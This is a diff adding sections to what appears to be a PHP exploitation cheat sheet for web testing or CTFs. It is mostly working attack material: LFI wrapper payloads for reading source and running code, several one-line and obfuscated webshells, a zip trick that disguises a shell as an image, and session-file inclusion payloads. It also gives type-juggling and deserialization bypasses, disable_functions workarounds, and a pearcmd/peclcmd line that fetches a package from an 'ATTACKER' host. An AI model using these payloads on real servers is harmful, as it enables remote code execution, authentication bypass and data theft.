@@ -1,5 +1,35 @@
 # PHP
 
+## First Checks
+
+```text
+/?file=php://filter/convert.base64-encode/resource=index.php
+/?page=data://text/plain,<?=`$_GET[0]`?>
+/?page=php://input
+/?page=expect://id
+/?page=zip://shell.jpg%23shell.php
+/?page=phar://upload.jpg/test.txt
+```
+
+Source/config targets:
+
+```text
+composer.json
+composer.lock
+.env
+config.php
+index.php
+vendor/autoload.php
+/proc/self/environ
+/proc/self/cmdline
+```
+
+Dangerous sinks to search:
+
+```bash
+rg -n "include|require|eval|assert|system|exec|shell_exec|passthru|popen|proc_open|unserialize|preg_replace|create_function|extract|parse_str|call_user_func|ReflectionFunction|file_get_contents|move_uploaded_file" .
+```
+
 ## Webshell
 
 ```php
@@ -23,7 +53,203 @@ Without space and alphanumeric
 
 ```
 
-##
+More shells:
+
+```php
+<?php system($_GET[0]); ?>
+<?php passthru($_REQUEST[0]); ?>
+<?php echo shell_exec($_POST[0]); ?>
+<?php $f='sys'.'tem'; $f($_GET[0]); ?>
+<?php array_map('system', $_GET); ?>
+<?php assert($_GET[0]); ?>
+```
+
+## Wrappers
+
+Read source:
+
+```text
+php://filter/convert.base64-encode/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/flag
+```
+
+Execute through include:
+
+```text
+data://text/plain,<?=`$_GET[0]`?>
+data://text/plain;base64,PD89YCRfR0VUWzBdYDs/Pg==
+php://input
+expect://id
+```
+
+Archive wrappers:
+
+```text
+zip://upload.jpg%23shell.php
+phar://upload.jpg/shell.txt
+compress.zlib://file.gz
+```
+
+Create zip wrapper payload:
+
+```bash
+echo '<?=`$_GET[0]`?>' > shell.php
+zip shell.jpg shell.php
+```
+
+## Type Juggling
+
+Loose comparison:
+
+```php
+0 == "a"
+"0e12345" == "0e54321"
+[] == false
+null == false
+```
+
+Magic hashes:
+
+```text
+md5("240610708") = 0e462097431906509019562988736854
+md5("QNKCDZO")   = 0e830400451993494058024219903391
+sha1("aaroZmOk") = 0e66507019969427134894567494305185566735
+```
+
+Payload shapes:
+
+```json
+{"password":0}
+{"password":true}
+{"password":[]}
+```
+
+Common bugs:
+
+```php
+if ($_GET["h"] == md5($secret)) {}
+if (strcmp($_GET["p"], $password) == 0) {}
+if (in_array($_GET["role"], ["user", "admin"])) {}
+```
+
+Try:
+
+```text
+?h=0
+?p[]=x
+?role=0
+```
+
+## Variable Override
+
+Look for `extract($_GET)`, `parse_str`, variable variables, or merging user arrays into config.
+
+```text
+?is_admin=1
+?role=admin
+?debug=1
+?GLOBALS[flag]=1
+?_SESSION[admin]=1
+?config[debug]=1
+```
+
+Array confusion:
+
+```text
+id[]=1
+id[0]=1
+id[$ne]=1
+file[]=index.php
+```
+
+## Deserialization
+
+PHP serialized probes:
+
+```text
+O:8:"stdClass":1:{s:1:"x";s:1:"y";}
+a:1:{s:5:"admin";b:1;}
+b:1;
+i:0;
+N;
+```
+
+Look for magic methods:
+
+```php
+__wakeup
+__destruct
+__toString
+__call
+__get
+__invoke
+```
+
+PHAR metadata deserialization can trigger through file functions if a vulnerable gadget is autoloaded:
+
+```text
+file_exists("phar://upload.jpg/a")
+is_file("phar://upload.jpg/a")
+getimagesize("phar://upload.jpg/a")
+exif_read_data("phar://upload.jpg/a")
+```
+
+## Sessions / Temp Files
+
+Session file inclusion:
+
+```text
+/var/lib/php/sessions/sess_<PHPSESSID>
+/tmp/sess_<PHPSESSID>
+```
+
+Set session content, then include the session file:
+
+```http
+Cookie: PHPSESSID=pwn
+
+name=<?=`$_GET[0]`?>
+```
+
+Upload progress temporary session content:
+
+```text
+PHP_SESSION_UPLOAD_PROGRESS=<?=`$_GET[0]`?>
+```
+
+## pearcmd / peclcmd
+
+If LFI can include PHP files and query args are parsed like CLI argv:
+
+```text
+/?+config-create+/<?=system($_GET[0]);?>+/tmp/s.php&file=/usr/local/lib/php/pearcmd.php
+/?file=/tmp/s.php&0=id
+/?+install+--force+--installroot+/tmp/pwn+http://ATTACKER/pkg.tgz&file=/usr/local/lib/php/peclcmd.php
+```
+
+## Disabled Function Bypasses
+
+Check:
+
+```php
+ini_get("disable_functions");
+function_exists("system");
+```
+
+Alternatives:
+
+```text
+exec
+shell_exec
+passthru
+popen
+proc_open
+pcntl_exec
+mail
+putenv + LD_PRELOAD
+ImageMagick / Ghostscript / ffmpeg delegates
+```
 
 ## Filter Chain Generator
 
